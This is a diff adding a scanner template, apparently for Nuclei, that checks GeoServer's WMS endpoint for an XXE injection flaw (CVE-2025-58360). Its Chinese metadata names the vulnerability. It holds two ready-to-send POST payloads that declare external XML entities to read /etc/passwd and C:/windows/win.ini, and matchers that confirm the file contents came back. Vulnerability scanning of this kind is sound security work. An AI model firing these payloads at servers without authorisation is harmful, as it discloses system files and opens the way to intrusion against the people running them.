@@ -1,0 +1,72 @@
+id: CVE-2025-58360
+
+info:
+  name: "GeoServer WMS XXE注入漏洞"
+  author: 无影
+  severity: high
+  description: Detects XXE vulnerability in GeoServer WMS service.
+  tags: geoserver
+
+http:
+  # ---------- Linux /etc/passwd 探测 ----------
+  - method: POST
+    path:
+      - "{{BaseURL}}/geoserver/wms?service=WMS&version=1.1.0&request=GetMap&layers=topp:states&bbox=-130,24,-66,50&width=800&height=400&srs=EPSG:4326&format=image/png"
+
+    headers:
+      Content-Type: application/vnd.ogc.sld+xml
+
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE StyledLayerDescriptor [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <StyledLayerDescriptor version="1.0.0" xmlns="http://www.opengis.net/sld">
+        <NamedLayer>
+          <Name>&xxe;</Name>
+          <UserStyle/>
+        </NamedLayer>
+      </StyledLayerDescriptor>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+  # ---------- Windows win.ini 探测 ----------
+  - method: POST
+    path:
+      - "{{BaseURL}}/geoserver/wms?service=WMS&version=1.1.0&request=GetMap&width=100&height=100&format=image/png&bbox=-180,-90,180,90"
+
+    headers:
+      Content-Type: application/xml
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE StyledLayerDescriptor [
+        <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
+      ]>
+      <StyledLayerDescriptor>
+        <NamedLayer>
+          <Name>&xxe;</Name>
+        </NamedLayer>
+      </StyledLayerDescriptor>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "[extensions]"
+          - "fonts"
